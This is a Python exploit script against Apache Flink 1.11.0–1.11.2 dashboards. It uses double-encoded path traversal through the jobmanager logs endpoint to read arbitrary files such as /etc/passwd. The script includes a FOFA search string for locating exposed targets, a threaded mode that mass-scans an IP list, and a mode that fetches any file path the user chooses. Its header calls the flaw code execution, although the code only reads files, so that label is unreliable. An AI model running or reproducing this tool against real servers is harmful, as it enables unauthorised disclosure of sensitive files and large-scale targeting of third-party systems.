#!/usr/bin/env python
# author:Xiaogang
# Help: FLink 1.11.0,1.11.1,1.11.2 代码执行
# fofa "apache-flink-dashboard"

import requests
from multiprocessing.dummy import Pool as ThreadPool
import sys


def get_iplist(txt):
    iplist = []
    with open(txt, 'r') as file:
        for i in file:
            iplist.append(i.strip())
    return iplist


def check(ip):
    payload = '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'
    url = 'http://' + ip + ':8081' + payload
    try:
        res = requests.request("GET", url=url, timeout=10)
        if "root" in res.text:
            result = {
                'IP': ip,
                'URL': url
            }
            print(result)
    except Exception as e:
        print("连接发生错误：{}".format(ip))


def attack(ip, payload):
    payload = payload.replace('/','%252f')
    url_payload = '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}'.format(payload)
    url = ip + url_payload
    print(url)
    try:
        res = requests.request("GET", url=url, timeout=10)
        print(res.text)
    except Exception as e:
        print("连接发生错误：{}".format(ip))


def main():
    args = sys.argv
    if args[2] == '-a'and len(args) == 4:
        attack(args[1], args[3])
    elif args[1] == '-t' and len(args) == 3:
        iplist = get_iplist(args[2])
        pool = ThreadPool(10)
        pool.map(check, iplist)
    else:
        print("Usage: python {} url -a payload")
        print("Usage: 批量验证IP")
        print("Usage: python {} -t 文件名")


if __name__ == '__main__':
    main()
